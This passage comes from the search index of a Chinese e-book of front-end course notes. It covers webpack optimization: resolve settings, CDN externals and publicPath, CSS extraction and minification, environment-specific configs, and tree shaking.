\u7248\u672c\u76f8\u5173\uff0c\u4e0d\u786e\u5b9a\u3002</p>"},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#resolveextensions","title":"\u4f18\u5316 resolve.extensions \u914d\u7f6e","text":"<p>extensions \u4e3b\u8981\u7ba1\u7406\u6587\u4ef6\u7684\u540e\u7f00\uff0c\u76f4\u63a5 import \u5373\u53ef\u5bfc\u5165\uff0c\u4e0d\u9700\u8981\u52a0\u4e0a js \u540e\u7f00</p> <p>\u4f46\u662f\u6ee5\u7528\u8fd9\u4e2a\u5c5e\u6027\uff0c\u9700\u8981 webpack \u53bb\u67e5\u627e\u5404\u79cd\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u6700\u597d\u53ea\u4f7f\u7528\u4e00\u4e24\u79cd</p> <pre><code>resolve.extensions: ['.js', '.json', '.ts']\n</code></pre> <p>\u5bfc\u5165\u8bed\u53e5\u5c3d\u91cf\u5e26\u4e0a\u6587\u4ef6\u540e\u7f00\uff08\u6027\u80fd\u548c\u6548\u7387\u5e73\u8861\uff09</p>"},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#external-cdn","title":"\u4f7f\u7528 external \u4f18\u5316\u9759\u6001\u8d44\u6e90 CDN","text":"<p>\u4f8b\u5982 jquery \u653e\u5728 CDN \u4e0a\uff0c\u4ece\u800c\u51cf\u5c11\u6253\u5305\u540e\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u628a jquery \u6253\u5305\u5230 bundle \u5185\u90e8\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 externals</p> <pre><code>module.exports = {\n  externals: {\n    'jquery': \"jQuery\",\n    'lodash': \"_\"\n  }\n};\n</code></pre> <p>\u7ebf\u4e0a\u4f7f\u7528\u4e86 CDN\uff0c\u6240\u4ee5\u5168\u5c40\u6709 jQuery \u8fd9\u4e2a\u5168\u5c40\u5bf9\u8c61\uff0c\u7136\u540e\u8fd9\u91cc\u6620\u5c04\u5230 jquery \u53d8\u91cf\uff0c\u5728\u6a21\u5757\u4e2d\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\u3002</p> <pre><code>import $ from 'jquery';\n</code></pre> <p>\u672c\u5730\u5f00\u53d1\u8fd8\u9700\u8981 npm install jquery \u64cd\u4f5c\uff0c\u5728 HTML \u6a21\u677f\u4e2d\u9700\u8981\u5f15\u5165 CDN</p>"},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#publicpathcdn","title":"\u4f7f\u7528\u9759\u6001\u8d44\u6e90\u8def\u5f84 publicPath(CDN)","text":"<pre><code>output: {\n  path: path.resolve(__dirname, \"./dist\"),\n  filename: \"[name].js\",\n  publicPath: 'https://cdn.test.com/assets'\n}\n</code></pre> <p>\u53ef\u4ee5\u628a\u6253\u5305\u540e\u7684 bundle \u653e\u5728 cdn \u4e0a\u9762\uff0c\u4fbf\u4e8e\u7528\u6237\u5c31\u8fd1\u8bbf\u95ee\uff08\u524d\u63d0\u662f\u516c\u53f8\u6709 CDN \u670d\u52a1\u5668\uff0c\u9700\u8981\u8fd0\u7ef4\u540c\u4e8b\u534f\u540c\u4e0a\u4f20\u5904\u7406\uff09</p> <p>\u7136\u540e\u5728\u6a21\u677f\u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 CDN \u7684\u94fe\u63a5</p> <pre><code>&lt;script src=\"https://cdn.test.com/assets/main.js\"&gt;&lt;/script&gt;\n</code></pre>"},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#css","title":"CSS  \u6587\u4ef6\u7684\u5904\u7406","text":""},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#loader-sass-less","title":"\u57fa\u672c loader (sass less)","text":"<pre><code>npm install less less-loader --save-dev\n</code></pre> <pre><code>{\n  test: /\\.less$/,\n  use: [\n    \"style-loader\",\n    {\n      loader: \"css-loader\",\n      options: {},\n    }\n    \"less-loader\",\n    \"postcss-loader\"\n  ]\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#postcss","title":"\u4f7f\u7528 postcss \u81ea\u52a8\u8865\u9f50\u6d4f\u89c8\u5668\u524d\u7f00","text":"<pre><code>npm install postcss-loader autoprefixer --save-dev\n</code></pre> <pre><code>module.exports = {\n  plugins: [\n    require('autoprefixer')({\n      overrideBrowsersList: [\n        \"last 2 versions\",\n        \"&gt;1%\"\n      ]\n    })\n  ]\n}\n</code></pre> <p>\u9ed8\u8ba4 css \u4f1a\u6253\u5305\u5230 js \u4e2d\u7684\uff0c\u8fd9\u6837 js \u5185\u5bb9\u5c31\u6bd4\u8f83\u5927\u3002\u6211\u4eec\u5e0c\u671b\u5355\u72ec\u751f\u6210 css \u7684\u6253\u5305\u6587\u4ef6\uff0c\u53ef\u4ee5\u5e76\u884c\u4e0b\u8f7d css \u548c js \u63d0\u9ad8\u9875\u9762\u52a0\u8f7d\u6548\u7387\u3002</p>"},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#css-minicssextractplugin","title":"\u62bd\u79bb css \u4f7f\u7528 MiniCssExtractPlugin","text":"<pre><code>npm install mini-css-extract-plugin -D\n</code></pre> <pre><code>const MiniCssExtractPlugin = require(\"mini-css-extract-plugin\");\n\n// plugin \u9700\u8981\u66f4\u6539\u4e00\u4e0b\n{\n  test: /\\.scss$/,\n  use: [\n    MiniCssExtractPlugin.loader,\n    \"css-loader\",\n    \"postcss-loader\",\n    \"sass-loader\"\n  ],\n}\n\n  plugins: [\n    new MiniCssExtractPlugin({\n      filename: \"css/[name]_[contenthash:6].css\",\n      chunkFilename: \"[id].css\"\n    })\n  ]\n</code></pre>"},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#css_1","title":"\u538b\u7f29 css","text":"<p>\u4f7f\u7528\u7b2c\u4e09\u65b9\u5e93\uff1aOptimize-css-assets-webpack-plugin\u3001cssnano</p> <pre><code>npm install cssnano optimize-css-assets-webpack-plugin --save-dev\n</code></pre> <pre><code>const OptimizeCSSAssetsPlugin = require(\"optimise-css-assets-webpack-plugin\");\n\nnew OptimiseCSSAssetsPlugin({\n  cssProcessor: require(\"cssnano\"), // \u538b\u7f29css\n  cssProcessorOptions: {\n    discardComments: {\n      removeAll: true\n    }\n  }\n});\n</code></pre>"},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#html","title":"\u538b\u7f29 HTML","text":"<p>html-webpack-plugin \u5b9e\u73b0\u538b\u7f29 HTML </p> <pre><code>new htmlWebpackPlugin({\n  title: '\u6d4b\u8bd5\u9875\u9762',\n  template: \"./index.html\",\n  filename: \"index.html\",\n  minify: {\n    removeComments: true,\n    collapseWhitespace: true,\n    minifyCSS: true\n  }\n})\n</code></pre>"},{"location":"ebook-kaikeba-frontend/15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/#_2","title":"\u4e0d\u540c\u6253\u5305\u73af\u5883\u7684\u914d\u7f6e","text":"<p>Webpack \u914d\u7f6e\u5b9e\u9645\u4e0a\u9700\u8981\u4e09\u4e2a\u6587\u4ef6\uff1a\u57fa\u7840\u914d\u7f6e\uff0c\u751f\u4ea7\u914d\u7f6e\uff0c\u5f00\u53d1\u914d\u7f6e\u3002\u4e0d\u540c\u60c5\u51b5\u4e0b\u6253\u5305\u914d\u7f6e\u4e0d\u540c\u3002\u6240\u4ee5\u5728\u5b66\u4e60\u63d2\u4ef6\u548c loader \u65f6\u9700\u8981\u660e\u786e\u9002\u5408\u4ec0\u4e48\u60c5\u51b5\u4e0b\u7684\u6253\u5305\u914d\u7f6e\u7b49\u3002</p> <p>\u65b9\u6cd5\u4e00\uff1a\u4f7f\u7528\u4e24\u4e2a package \u811a\u672c</p> <p>\u9700\u8981\u4e00\u4e2a merge \u7684\u5305\uff0c\u4f1a\u628a\u57fa\u7840\u914d\u7f6e\u548c\u751f\u4ea7\u914d\u7f6e\u5408\u5e76\u8d77\u6765\u7684\u5305</p> <pre><code>npm install webpack-merge --save-dev\n</code></pre> <pre><code>const merge = require(\"webpack-merge\");\nconst baseConfig = require(\"./webapck.base.js\");\nconst devConfig = {\n  // \u5f00\u53d1\u914d\u7f6e\n  mode: \"development\",\n  devtool: \"cheap-inline-source-map\",\n};\n\nmodule.exports = merge(baseConfig, devConfig);\n</code></pre> <pre><code>{\n  \"scripts\": {\n    \"dev\": \"webpack-dev-server --config ./webpack.dev.js\",\n    \"build\": \"webpack --config ./webpack.prod.js\"\n  }\n}\n</code></pre> <p>\u65b9\u6cd5\u4e8c\uff1a\u4f7f\u7528\u4e00\u4e2a\u811a\u672c\uff0c\u811a\u672c\u4f20\u53c2\u8bbe\u7f6e\u6253\u5305\u6a21\u5f0f</p> <pre><code>\"build\": \"webpack --env.production --config webpack.dev.js\"\n</code></pre> <pre><code>const baseConfig = require('./webpack.base.js');\nconst devConfig = require('./webpack.dev.js');\nconst proConfig = require('./webpack.pro.js');\nconst merge = require('webpack-merge');\n\nmodule.exports = (env) =&gt; {\n  if (env &amp;&amp; env.production) {\n    return merge(baseConfig, proConfig);\n  } else {\n    return merge(baseConfig, devConfig);\n  }\n};\n</code></pre> <p>\u8fd9\u6837\u5199\uff0c\u53ef\u80fd\u5728 windows \u4e0a\u8def\u5f84\u4e0d\u6b63\u786e\uff08\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e0d\u517c\u5bb9\u95ee\u9898\uff09</p> <p>\u53ef\u4ee5\u4f7f\u7528 cross-env \u89e3\u51b3</p> <pre><code>\"build\": \"cross-env NODE_ENV=test webpack --config webpack.test.js\"\n</code></pre> <pre><code>process.env.NODE_ENV \u83b7\u53d6\u53c2\u6570\n</code></pre> <p>VUE-CLI \u5177\u4f53\u914d\u7f6e\u89c1\u5b98\u7f51</p> <p>Cli.vuejs.org</p>"},{"location":"ebook-kaikeba-frontend/16-webpack%E4%BC%98%E5%8C%96%E5%AE%98%E6%96%B9/","title":"webpack\u6027\u80fd\u4f18\u5316 \u4f18\u5316\u5f00\u53d1\u4f53\u9a8c","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 18859  \u9605\u8bfb38\u5206\u949f</p> <p>2021-10-29</p> <p>\u8fd9\u90e8\u5206\u5bf9\u5e94\u89c6\u9891\u6559\u7a0b\u4e2d 456 \u4e09\u8282\uff0c\u539f\u59cb\u7b14\u8bb0\u6bd4\u8f83\u4e71\u3002</p> <p>\u8fd9\u4e09\u8282\u89c6\u9891\u8f83\u957f\uff0c\u8bb2\u5e08\u6c34\u5e73\u4e00\u822c\uff0c\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u5b66\u4e60\u3002</p>"},{"location":"ebook-kaikeba-frontend/16-webpack%E4%BC%98%E5%8C%96%E5%AE%98%E6%96%B9/#_1","title":"\u4f18\u5316\u5f00\u53d1\u4f53\u9a8c","text":"<p>\u63d0\u5347\u6548\u7387\uff1b\u4f18\u5316\u6784\u5efa\u901f\u5ea6\uff1b\u4f18\u5316\u4f7f\u2f64\u4f53\u9a8c</p>"},{"location":"ebook-kaikeba-frontend/16-webpack%E4%BC%98%E5%8C%96%E5%AE%98%E6%96%B9/#_2","title":"\u4f18\u5316\u8f93\u51fa\u8d28\u91cf","text":"<p>\u4f18\u5316\u8981\u53d1\u5e03\u5230\u7ebf\u4e0a\u7684\u4ee3\u7801\uff0c\u51cf\u5c11\u2f64\u6237\u80fd\u611f\u77e5\u5230\u7684\u52a0\u8f7d\u65f6\u95f4\uff1b\u63d0\u5347\u4ee3\u7801\u6027\u80fd\uff0c\u6027\u80fd\u597d\uff0c\u6267\u2f8f\u5c31\u5feb</p> <p>\u7f29\u2f29\u5c0f\u2f42\u6587\u4ef6\u8303\u56f4</p> <p>Loader \u4f18\u5316loader\u914d\u7f6e</p> <p>test include exclude\u4e09\u4e2a\u914d\u7f6e\u9879\u6765\u7f29\u5c0f loader \u7684\u5904\u7406\u8303\u56f4 \u63a8\u8350 include</p> <pre><code>include: path.resolve(__dirname, \"./src\"),\n</code></pre>"},{"location":"ebook-kaikeba-frontend/16-webpack%E4%BC%98%E5%8C%96%E5%AE%98%E6%96%B9/#resolvemodules","title":"\u4f18\u5316 resolve.modules \u914d\u7f6e","text":"<p>resolve.modules \u2f64\u4e8e\u914d\u7f6e webpack \u53bb\u54ea\u4e9b\u2f6c\u5f55\u4e0b\u5bfb\u627e\u7b2c\u4e09\u2f45\u6a21\u5757\uff0c\u9ed8\u8ba4\u662f['node_modules']</p> <p>\u5bfb\u627e\u7b2c\u4e09\u2f45\u6a21\u5757\uff0c\u9ed8\u8ba4\u662f\u5728\u5f53\u524d\u9879\u2f6c\u76ee\u2f6c\u76ee\u5f55\u4e0b\u7684node_modules\u2fa5\u9762\u53bb\u627e\uff0c\u5982\u679c\u6ca1\u6709\u627e\u5230\uff0c\u5c31\u4f1a\u53bb\u4e0a\u2f00\u7ea7\u76ee\u5f55../node_modules\u627e\uff0c\u518d\u6ca1\u6709\u4f1a\u53bb../../node_modules\u4e2d\u627e\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0c\u548cNode.js\u7684\u6a21\u5757\u5bfb\u627e\u673a\u5236\u5f88\u7c7b\u4f3c\u3002</p> <p>\u5982\u679c\u6211\u4eec\u7684\u7b2c\u4e09\u2f45\u6a21\u5757\u90fd\u5b89\u88c5\u5728\u4e86\uf9ba\u9879\u2f6c\u6839\u76ee\u5f55\u4e0b\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u6307\u660e\u8fd9\u4e2a\uf937\u5f84\u3002</p>"},{"location":"ebook-kaikeba-frontend/16-webpack%E4%BC%98%E5%8C%96%E5%AE%98%E6%96%B9/#resolvealias","title":"\u4f18\u5316 resolve.alias \u914d\u7f6e","text":"<p>resolve.alias\u914d\u7f6e\u901a\u8fc7\u522b\u540d\u6765\u5c06\u539f\u5bfc\u5165\uf937\u5f84\u6620\u5c04\u6210\u2f00\u4e2a\u65b0\u7684\u5bfc\u2f0a\uf937\u5f84</p> <p>\u62ffreact\u4e3a\u4f8b\uff0c\u6211\u4eec\u5f15\u2f0a\u5165\u7684react\u5e93\uff0c\u2f00\u822c\u5b58\u5728\u4e24\u5957\u4ee3\u7801</p> <p>cjs \u91c7\u2f64commonJS\u89c4\u8303\u7684\u6a21\u5757\u5316\u4ee3\u7801\uff0cumd \u5df2\u7ecf\u6253\u5305\u597d\u7684\u5b8c\u6574\u4ee3\u7801\uff0c\u6ca1\u6709\u91c7\u2f64\u6a21\u5757\u5316\uff0c\u53ef\u4ee5\u76f4\u63a5\u6267\u2f8f</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cwebpack\u4f1a\u4ece\u2f0a\u53e3\u2f42\u4ef6 ./node_modules/bin/react/index \u5f00\u59cb\u9012\u5f52\u89e3\u6790\u548c\u5904\u7406\u4f9d\u8d56\u7684\u6587\u4ef6\u3002\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9a\u2f42\u4ef6\uff0c\u907f\u514d\u8fd9\u5904\u7684\u8017\u65f6\u3002</p> <pre><code>module.exports={\n  resolve:{\n    modules: [path.resolve(__dirname, \"./node_modules\")]\n  }\n}\n</code></pre> <pre><code>alias: {\n  \"@\": path.join(__dirname, \"./pages\"),\n  \"react\": path.resolve(__dirname, \"./node_modules/react/umd/react.production.min.js\"),\n  \"react-dom\": path.resolve( __dirname, \"./node_modules/react-dom/umd/react-dom.production.min.js\")\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/16-webpack%E4%BC%98%E5%8C%96%E5%AE%98%E6%96%B9/#resolveextensions","title":"\u4f18\u5316 resolve.extensions","text":"<p>\u914d\u7f6e resolve.extensions \u5728\u5bfc\u5165\u8bed\u53e5\u6ca1\u5e26\u6587\u4ef6\u540e\u7f00\u65f6\uff0cwebpack \u4f1a\u2f83\u81ea\u52a8\u5e26\u4e0a\u540e\u7f00\u540e\uff0c\u53bb\u5c1d\u8bd5\u67e5\u627e\u6587\u4ef6\u662f\u5426\u5b58\u5728\u3002</p> <p>\u9ed8\u8ba4\u503c:</p> <pre><code>extensions:['.js','.json','.jsx','.ts']\n</code></pre> <p>\u540e\u7f00\u5c1d\u8bd5\uf99c\u8868\u5c3d\uf97e\u7684\u5c0f</p> <p>\u5bfc\u5165\u8bed\u53e5\u5c3d\u91cf\uf97e\u7684\u5e26\u4e0a\u540e\u7f00\u3002</p> <p>\u4f7f\u2f64 externals \u4f18\u5316 cdn \u9759\u6001\u8d44\u6e90\uff1a\u516c\u53f8\u6709cdn:\u9759\u6001\u8d44\u6e90\u6709\u90e8\u7f72\u5230cdn \u6709\u94fe\u63a5\u4e86\uf9ba</p> <p>\u6211\u7684bundle\u2f42\u4ef6\u2fa5\uff0c\u5c31\u4e0d\u2f64\u6253\u5305\u8fdb\u53bb\u8fd9\u4e2a\u4f9d\u8d56\uf9ba\uff0c\u4f53\u79ef\u4f1a\u5c0f</p> <p>\u6211\u4eec\u53ef\u4ee5\u5c06\u2f00\u4e9bJS\u2f42\u6587\u4ef6\u5b58\u50a8\u5728 CDN \u4e0a(\u51cf\u5c11 Webpack \u6253\u5305\u51fa\u6765\u7684 js \u4f53\u79ef)\uff0c\u5728 index.html \u4e2d\u901a\u8fc7\u6807\u7b7e\u5f15\u5165\uff0c\u5982:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt;\n    &lt;title&gt;Document&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div id=\"root\"&gt;root&lt;/div&gt;\n    &lt;script src=\"http://libs.baidu.com/jquery/2.0.0/jquery.min.js\"&gt;&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u6211\u4eec\u5e0c\u671b\u5728\u4f7f\u2f64\u65f6\uff0c\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7 import \u7684\u2f45\u5f0f\u53bb\u5f15\u2f64(\u5982 import $ from 'jquery' )\uff0c\u5e76\u4e14\u5e0c\u671b webpack \u4e0d\u4f1a\u5bf9\u5176\u8fdb\u2f8f\u6253\u5305\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u914d\u7f6e externals \u3002</p> <pre><code>//webpack.config.js\nmodule.exports = {\n  //...\n  externals: {\n    //jquery\u901a\u8fc7script\u5f15\u2f0a\u5165\u4e4b\u540e\uff0c\u5168\u5c40\u4e2d\u5373\u6709\u4e86\uf9ba jQuery \u53d8\u91cf\uf97e 'jquery': 'jQuery'\n  }\n}\n</code></pre> <p>\u4f7f\u2f64\u9759\u6001\u8d44\u6e90\u8def\uf937\u5f84publicPath(CDN) CDN\u901a\u8fc7\u5c06\u8d44\u6e90\u90e8\u7f72\u5230\u4e16\u754c\u5404\u5730\uff0c\u4f7f\u5f97\u2f64\u6237\u53ef\u4ee5\u5c31\u8fd1\u8bbf\u95ee\u8d44\u6e90\uff0c\u52a0\u5feb\u8bbf\u95ee\u901f\u5ea6\u3002\u8981\u63a5\u5165CDN\uff0c\u9700\u8981\u628a\u2f79\u7f51\u2eda\u9875\u7684\u9759\u6001\u8d44\u6e90\u4e0a\u4f20\u5230CDN\u670d\u52a1\u4e0a\uff0c\u5728\u8bbf\u95ee\u8fd9\u4e9b\u8d44\u6e90\u65f6\uff0c\u4f7f\u2f64CDN\u670d\u52a1\u63d0\u4f9b\u7684URL\u3002</p> <p>\u54b1\u4eec\u516c\u53f8\u5f97\u6709cdn\u670d\u52a1\u5668\ufa38\u5730\u5740 \u786e\u4fdd\u9759\u6001\u8d44\u6e90\u2f42\u6587\u4ef6\u7684\u4e0a\u4f20\u4e0e\u5426</p> <p>css\u2f42\u6587\u4ef6\u7684\u5904\u7406 \u4f7f\u2f64less\u6216\u8005sass\u5f53\u505acss\u6280\u672f\u6808</p> <pre><code>$ npm install less less-loader --save-dev\n</code></pre> <p>\u4f7f\u2f64postcss\u4e3a\u6837\u5f0f\u2f83\u81ea\u52a8\u8865\u2eec\u9f50\u6d4f\u89c8\u5668\ufa38\u524d\u7f00 https://caniuse.com/</p> <pre><code>npm i  postcss-loader autoprefixer -D\n</code></pre> <p>\u65b0\u5efapostcss.config.js </p> <pre><code>// webpack.config.js\noutput: {\n  publicPath: '//cdnURL.com', //\u6307\u5b9a\u5b58\u653eJS\u2f42\u6587\u4ef6\u7684CDN\u5730\u5740\n}\n  {\n    test: /\\.less$/,\n      use: [\"style-loader\", \"css-loader\", \"less-loader\"]\n  }\n\n  module.exports = {\n    plugins: [\n      require(\"autoprefixer\")({\n        overrideBrowserslist: [\"last 2 versions\", \"&gt;1%\"]\n      }) \n    ]\n  };\n</code></pre>"},{"location":"ebook-kaikeba-frontend/16-webpack%E4%BC%98%E5%8C%96%E5%AE%98%E6%96%B9/#indexless","title":"index.less","text":"<pre><code>body { div {\n\n    display: flex;\n    border: 1px red solid;\n  }\n\n\n}\n</code></pre> <p>webpack.config.js <pre><code>{\n  test: /\\.less$/,\n  include: path.resolve(__dirname, \"./src\"),\n  use: [\n    \"style-loader\",\n    {\n      loader: \"css-loader\",\n      options: {}\n    },\n    \"less-loader\",\n    \"postcss-loader\"\n\n\n\n] },\n</code></pre></p> <p>\u5982\u679c\u4e0d\u505a\u62bd\u53d6\u914d\u7f6e\uff0c\u6211\u4eec\u7684 css \u662f\u76f4\u63a5\u6253\u5305\u8fdb js \u2fa5\u91cc\uf9e9\u2faf\u9762\u7684\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u5355\u72ec\u2f63\u751f\u6210 css \u2f42\u6587\u4ef6\u3002 \u56e0\u4e3a\u5355\u72ec\u2f63\u751f \u6210css,css\u53ef\u4ee5\u548cjs\u5e76\u2f8f\u4e0b\u8f7d\uff0c\u63d0\u2fbc\u9ad8\u9875\u2faf\u52a0\u8f7d\u6548\u7387</p> <p>\u501f\u52a9MiniCssExtractPlugin \u5b8c\u6210\u62bd\u79bbcss</p> <pre><code>npm install mini-css-extract-plugin -D\nconst MiniCssExtractPlugin = require(\"mini-css-extract-plugin\");\n {\n   test: /\\.scss$/,\n\n\n\nuse: \\[\n // \"style-loader\", // \u4e0d\u518d\u9700\u8981style-loader\uff0c\u2f64MiniCssExtractPlugin.loader\n</code></pre> <p>\u4ee3\u66ff</p> <pre><code>MiniCssExtractPlugin.loader,\n</code></pre> <p>\"css-loader\", // \u7f16\u8bd1css \"postcss-loader\", \"sass-loader\" // \u7f16\u8bd1scss</p> <p>] },</p> <pre><code>plugins: [\n   new MiniCssExtractPlugin({\n     filename: \"css/[name]_[contenthash:6].css\",\n     chunkFilename: \"[id].css\"\n   })\n]\n</code></pre>"},{"location":"ebook-kaikeba-frontend/16-webpack%E4%BC%98%E5%8C%96%E5%AE%98%E6%96%B9/#css","title":"\u538b\u7f29css","text":"<p>\u501f\u52a9 optimize-css-assets-webpack-plugin</p> <p>\u501f\u52a9cssnano</p> <p>\u5b89\u88c5</p> <p>npm install cssnano -D</p> <pre><code>// npm i optimize-css-assets-webpack-plugin -D\nconst OptimizeCSSAssetsPlugin = require(\"optimize-css-assets-webpack-plugin\");\n\nnew OptimizeCSSAssetsPlugin({\n cssProcessor: require(\"cssnano\"), //\u5f15\u2f0a\u5165cssnano\u914d\u7f6e\u538b\u7f29\u9009\u9879 cssProcessorOptions: {\n    discardComments: { removeAll: true }\n  }\n\n})\n\n// \u538b\u7f29HTML \u501f\u52a9html-webpack-plugin\n\nnew htmlWebpackPlugin({ title: \"\u4eac\u4e1c\u5546\u57ce\",\n\n\n      template: \"./index.html\",\n      filename: \"index.html\",\n      minify: {\n// \u538b\u7f29HTML\u2f42\u6587\u4ef6\n removeComments: true, \n // \u79fb\u9664HTML\u4e2d\u7684\u6ce8\u91ca \n collapseWhitespace: true, \n // \u5220\u9664\u7a7a\u2f69\u767d\u7b26\u4e0e\u6362\u2f8f\u7b26 \n minifyCSS: true \n // \u538b\u7f29\u5185\u8054css\n\n} }),\n</code></pre> <p>development vs Production\u6a21\u5f0f\u533a\u5206\u6253\u5305 npm install webpack-merge -D</p> <p>\u6848\u4f8b</p> <pre><code>const merge = require(\"webpack-merge\")\nconst commonConfig =  require(\"./webpack.common.js\")\nconst devConfig = {\n\n\n... \n}\nmodule.exports = merge(commonConfig,devConfig)\n//package.js\n\"scripts\":{\n  \"dev\":\"webpack-dev-server --config ./build/webpack.dev.js\",\n  \"build\":\"webpack --config ./build/webpack.prod.js\"\n}\n</code></pre> <p>\u57fa\u4e8e\u73af\u5883\u53d8\u91cf\uf97e\u533a\u5206</p> <p>\u501f\u52a9cross-env</p> <pre><code>npm i cross-env -D\n</code></pre> <p>package\u2fa5\u91cc\uf9e9\u2faf\u9762\u914d\u7f6e\u547d\u4ee4\u811a\u672c\uff0c\u4f20\u2f0a\u5165\u53c2\u6570</p> <p>\u5728webpack.config.js\u2fa5\u91cc\uf9e9\u62ff\u5230\u53c2\u6570 process.env.NODE_ENV</p> <p>tree Shaking</p> <p>webpack2.x\u5f00\u59cb\u2f40\u652f\u6301 tree shaking\u6982\u5ff5\uff0c\u987e\u540d\u601d\u4e49\uff0c\"\u6447\u6811\"\uff0c\u6e05\u9664\u2f46\u65e0\u2f64 css,js(Dead Code) Dead Code \u2f00\u822c\u5177\u6709\u4ee5\u4e0b\u2f0f\u51e0\u4e2a\u7279\u5f81</p> <p>\u4ee3\u7801\u4e0d\u4f1a\u88ab\u6267\u2f8f\uff0c\u4e0d\u53ef\u5230\u8fbe \u4ee3\u7801\u6267\u2f8f\u7684\u7ed3\u679c\u4e0d\u4f1a\u88ab\u2f64\u5230 \u4ee3\u7801\u53ea\u4f1a\u5f71\u54cd\u6b7b\u53d8\u91cf\uf97e(\u53ea\u5199\u4e0d\u8bfb)  Js tree shaking\u53ea\u2f40\u652f\u6301ES module\u7684\u5f15\u2f0a\u5165\u2f45\u5f0f!!!!,</p> <pre><code>##package.json\n\"test\": \"cross-env NODE_ENV=test webpack --config ./webpack.config.test.js\",\n</code></pre> <p>//\u5916\u90e8\u4f20\u2f0a\u5165\u7684\u5168\u5c40\u53d8\u91cf\uf97e module.exports = (env)=&gt;{</p> <pre><code>  if(env &amp;&amp; env.production){\n    return merge(commonConfig,prodConfig)\n  }else{\n    return merge(commonConfig,devConfig)\n\n\n\n} }\n</code></pre> <p>//\u5916\u90e8\u4f20\u2f0a\u5165\u53d8\u91cf\uf97e  scripts:\" --env.production\"</p>"},{"location":"ebook-kaikeba-frontend/16-webpack%E4%BC%98%E5%8C%96%E5%AE%98%E6%96%B9/#css-tree-shaking","title":"Css tree shaking","text":"<pre><code>// npm i glob-all purify-css purifycss-webpack --save-dev\nconst PurifyCSS = require('purifycss-webpack')\nconst glob = require('glob-all')\nplugins:[\n// \u6e05\u9664\u2f46\u65e0\u2f64 css new PurifyCSS({\n\npaths: glob.sync(\\[\n // \u8981\u505a CSS Tree Shaking \u7684\u8def\uf937\u5f84\u2f42\u6587\u4ef6\n path.resolve(\\_\\_dirname, './src/\\*.html'), // \u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u540c\u6837\u9700\u8981\u5bf9 html \u2f42\u6587\u4ef6\u8fdb\u2f8f tree shaking\n path.resolve(\\_\\_dirname, './src/\\*.js')\n\n]) \n})\n\n]\n</code></pre>"},{"location":"ebook-kaikeba-frontend/16-webpack%E4%BC%98%E5%8C%96%E5%AE%98%E6%96%B9/#js-tree-shaking","title":"JS tree shaking","text":"<p>\u53ea\u2f40\u652f\u6301import\u2f45\u5f0f\u5f15\u2f0a\u5165\uff0c\u4e0d\u2f40\u652f\u6301commonjs\u7684\u2f45\u5f0f\u5f15\u2f0a\u5165 \u6848\u4f8b:</p> <p>//expo.js</p> <pre><code>export const add = (a, b) =&gt; {\n  return a + b;\n};\n\nexport const minus = (a, b) =&gt; {\n  return a - b;\n};\n\n//index.js\n\nimport { add } from \"./expo\";\nadd(1, 2);\n//webpack.config.js\n</code></pre> <p>optimization: {  usedExports: true // \u54ea\u4e9b\u5bfc\u51fa\u7684\u6a21\u5757\u88ab\u4f7f\u2f64\u4e86\uf9ba\uff0c\u518d\u505a\u6253\u5305 }</p> <p>\u53ea\u8981mode\u662fproduction\u5c31\u4f1a\u2f63\u751f\u6548\uff0cdevelpoment\u7684tree shaking\u662f\u4e0d\u2f63\u751f\u6548\u7684\uff0c\u56e0\u4e3awebpack\u4e3a\u4e86\uf9ba \u2f45\u4fbf\uf965\u4f60\u7684\u8c03\u8bd5</p> <p>\u53ef\u4ee5\u67e5\u770b\u6253\u5305\u540e\u7684\u4ee3\u7801\u6ce8\u91ca\u4ee5\u8fa8\u522b\u662f\u5426\u2f63\u751f\u6548\u3002 \u2f63\u751f\u4ea7\u6a21\u5f0f\u4e0d\u9700\u8981\u914d\u7f6e\uff0c\u9ed8\u8ba4\u5f00\u542f</p> 